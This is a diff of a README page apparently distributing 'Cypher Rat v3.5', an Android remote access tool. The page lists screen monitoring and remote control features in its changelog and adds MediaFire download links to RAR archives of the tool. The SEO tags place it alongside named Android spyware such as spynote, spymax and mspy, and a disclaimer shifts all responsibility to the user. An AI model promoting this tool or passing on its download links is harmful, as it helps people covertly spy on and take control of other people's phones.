@@ -1,5 +1,6 @@
 # Cypher-Rat-Full
-Cypher Rat Full Version - Advanced Android Remote Tool 2022
+Cypher Rat v3.5 Full Version - Advanced Android Remote Tool 2022
+
 
 Cypher Rat is Advanced Android Remote Administration Tool
 With Cypher Rat You can remote and Manage your android phone
@@ -21,7 +22,31 @@ you are the only responsible for any kind of use of this tool , the developer is
 
 -------------
 
-**UPDATE 5/19/2022** !!  NEW 
+
+**UPDATE 6/10/2022** !!  NEW 
+
+1- Fix Rat not Working on some rdp
+
+2- Fix Screen Monitor not working some time
+
+3- Update apk to new one
+
+4- new install window for apk
+
+5-  application manager now shows icons
+
+6- Add Enter text for screen control
+
+7-  Update Screen Control More accurate
+
+8- new dark them
+
+9- bug fixes and improvements
+
+--------------
+
+
+**UPDATE 5/19/2022** !!  
 
 1- Can Run on RDP or Virtual Machine
 
@@ -110,9 +135,15 @@ Images :
 
 --------------
 
+**UPDATE 6/10/2022**  NEW
+
+[DOWNLOAD]([https://www.mediafire.com/file/ci74w5dhinrsd2t/CypherRat+V3.5.rar/file])
+
+--------------
+
 **UPDATE 5/19/2022**
 
-[DOWNLOAD](https://www.mediafire.com/file/nmrpeg05ugyembm/Cypher_Rat_V3_Full_Version.rar/file)
+[DOWNLOAD OLD VERSION](https://www.mediafire.com/file/nmrpeg05ugyembm/Cypher_Rat_V3_Full_Version.rar/file)
 
 --------------
 
@@ -132,24 +163,4 @@ This project is licensed under the MIT License - see the [LICENSE](https://githu
 
 
 
-
-#cypher_rat,
-#Cypher_rat_v3,
-#cypher_Rat_by_evlf,
-cypher rat v3,
-cypher rat,
-cypher rat 2022,
-Android rat v3 2022,
-cypher rat full version,
-cypher rat v5,
-cypherrat,
-android rat,
-rat android,
-android vnc,
-android remote,
-android control,
-android monitor,
-mspy,
-spynote,
-spymax,
-mobihok,
+#cypher_rat, #Cypher_rat_v3, #cypher_Rat_by_evlf, cypher rat v3, cypher rat, cypher rat 2022, Android rat v3 2022, cypher rat full version, cypher rat v5, cypherrat, android rat, rat android, android vnc, android remote, android control, android monitor, mspy, spynote, spymax, mobihok, cypher rat 3.5 , cypher rat screen control , cypher rat monitor , cypher rat v3.5 , cypher_rat_3.5
